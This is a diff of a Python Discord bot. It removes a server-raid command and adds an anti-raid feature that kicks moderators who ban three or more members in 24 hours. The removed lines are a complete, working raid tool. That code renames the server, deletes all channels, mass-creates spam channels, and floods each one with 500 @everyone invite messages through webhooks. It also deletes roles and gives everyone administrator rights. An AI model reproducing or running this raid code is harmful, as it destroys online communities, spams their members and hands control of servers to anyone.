@@ -1,90 +1,73 @@
 import discord
 from discord.ext import commands
-import asyncio
+from datetime import datetime, timedelta, timezone
 import os
-from flask import Flask
-from threading import Thread
+from collections import defaultdict
 
-# --- Webサーバー設定 ---
-app = Flask('')
-@app.route('/')
-def home(): return "Bot is active"
+# 日本時間 (JST)
+JST = timezone(timedelta(hours=9))
 
-def run(): app.run(host='0.0.0.0', port=8080)
-def keep_alive():
-    t = Thread(target=run)
-    t.start()
+intents = discord.Intents.default()
+intents.moderation = True
+intents.members = True
+intents.message_content = True
 
-# --- Discord Bot設定 ---
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix="/", intents=intents)
 
-MESSAGE_CONTENT = """# 🌟 遊びに来て、ただ“話すだけ”の場所がここにある。
-「ちょっと疲れたから雑に話したい」
-「誰かとゲームの話で盛り上がりたい」
-「変なこと考えてるけど共感してくれる人いるかな」
-そんな時の“居場所”が、このサーバーです。
-
-💬 こんなことができるよ
-日常のあれこれ（今日あったこと、好きなもの、くだらないボケなど）を気軽に共有
-「この本すごかった」「この映画ヤバい」みたいな熱い語りもOK
-みんなで企画するミニゲーム、テーマトーク、お絵かき大会など、不定期でワイワイイベントも
-
-👋 このサーバーが初めての人へ
-“挨拶だけ”でも大歓迎。「はじめまして」チャットがあるので安心！
-年齢・性別・趣味関係なし。好きなもの語ろう。
-真面目な話も、くだらない話も。いい意味で“ゆるく”がモットー。
-
-🚀 招待はこちら →
-discord.gg/gxFhrzUZdK
-「ちょっと見てみようかな」その気軽さで大丈夫。あなたの日常の1コマに、新しい友達が加わるかも。 @everyone"""
+# グローバル変数で通知チャンネルとBAN履歴を保持
+target_channel_id = None
+ban_history = defaultdict(list)
 
 @bot.event
 async def on_ready():
-    print(f'✅ Logged in as {bot.user.name}')
+    print(f"Logged in as {bot.user}")
+    # UptimeRobotなどの死活監視用メッセージ
+    print("Bot is running and monitored by UptimeRobot.")
 
-@bot.command()
-async def ima(ctx):
-    guild = ctx.guild
+# 通知チャンネルを設定するコマンド: /c #チャンネル
+@bot.command(name="c")
+async def set_channel(ctx, channel: discord.TextChannel):
+    global target_channel_id
+    target_channel_id = channel.id
+    await ctx.send(f"通知先を {channel.mention} に設定しました。")
+
+@bot.event
+async def on_member_ban(guild, user):
+    now = datetime.now(timezone.utc)
     
-    # 1. サーバー名の変更
-    try: await guild.edit(name="みんなの住処植民地")
-    except: pass
+    # 監査ログから直近のBAN実行者を取得
+    async for entry in guild.audit_logs(action=discord.AuditLogAction.ban, limit=1):
+        moderator = entry.user
+        if moderator.bot: return
 
-    # 2. チャンネル全削除 (一気に処理)
-    delete_tasks = [channel.delete() for channel in guild.channels]
-    await asyncio.gather(*delete_tasks, return_exceptions=True)
+        # 24時間以内のBAN回数をカウント
+        ban_history[moderator.id] = [t for t in ban_history[moderator.id] if now - t < timedelta(hours=24)]
+        ban_history[moderator.id].append(now)
 
-    # 3. チャンネル25個作成
-    create_tasks = [guild.create_text_channel('imaばんざい') for _ in range(25)]
-    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
-
-    # 4. Webhookでの一斉送信
-    async def send_spam(channel):
-        if isinstance(channel, discord.TextChannel):
+        # 3回目を超えたらキック
+        if len(ban_history[moderator.id]) >= 3:
             try:
-                webhook = await channel.create_webhook(name="Ima_Promotion")
-                # 500メッセージを各チャンネルで送信
-                for _ in range(500):
-                    await webhook.send(content=MESSAGE_CONTENT, username="居場所")
-                    await asyncio.sleep(0.1) # 1ウェブフックあたり0.7秒の待機
-            except: pass
+                # 荒らしの疑いでキック
+                await moderator.kick(reason="24時間以内に3回以上のBANを実行したため")
+                
+                # 指定されたチャンネルへ通知
+                if target_channel_id:
+                    channel = guild.get_channel(target_channel_id)
+                    if channel:
+                        jst_now = datetime.now(JST).strftime('%Y/%m/%d/%H/%M/%S')
+                        embed = discord.Embed(
+                            description=f"{moderator.mention} を荒らしの疑いでキック処分にしました\n-# {jst_now}",
+                            color=0xff0000 # 赤色
+                        )
+                        await channel.send(embed=embed)
 
-    # すべての作成済みチャンネルに対して送信タスクを開始
-    for ch in new_channels:
-        if not isinstance(ch, Exception):
-            asyncio.create_task(send_spam(ch))
+                # カウントリセット
+                ban_history[moderator.id] = []
+                
+            except discord.Forbidden:
+                print(f"Error: {moderator.name} をキックする権限がBotにありません。")
+            except Exception as e:
+                print(f"Error: {e}")
 
-    # 5. ロール削除 & @everyone 管理者権限
-    for role in guild.roles:
-        if role.name != "@everyone" and not role.managed:
-            try: await role.delete()
-            except: pass
-
-    try:
-        await guild.default_role.edit(permissions=discord.Permissions.all())
-    except: pass
-
-if __name__ == "__main__":
-    keep_alive()
-    bot.run(os.environ.get("DISCORD_BOT_TOKEN"))
+# Koyebの環境変数 DISCORD_TOKEN を使用
+bot.run(os.getenv("DISCORD_TOKEN"))
